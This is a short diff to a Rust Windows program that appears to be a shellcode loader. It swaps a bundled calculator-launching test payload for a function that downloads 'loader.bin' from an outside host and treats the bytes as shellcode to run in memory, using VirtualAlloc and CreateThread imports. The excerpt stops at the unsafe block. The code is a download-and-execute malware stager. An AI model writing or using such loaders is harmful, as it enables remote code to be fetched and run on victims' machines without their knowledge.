@@ -5,10 +5,19 @@ use windows_sys::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
+use std::io::Read;
 
-#[cfg(target_os = "windows")]
+pub fn download_data() -> Vec<u8> {
+    let client = reqwest::blocking::Client::builder().build().unwrap();
+    let mut res = client.get("https://kaboum.xyz/artdonjon/loader.bin").send().unwrap();
+    let mut body: Vec<u8> = Vec::new();
+    res.read_to_end(&mut body).unwrap();
+    body
+}
+
+
 fn main() {
-    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+    let shellcode: &[u8] = &&download_data();
     let shellcode_size = shellcode.len();
 
     unsafe {
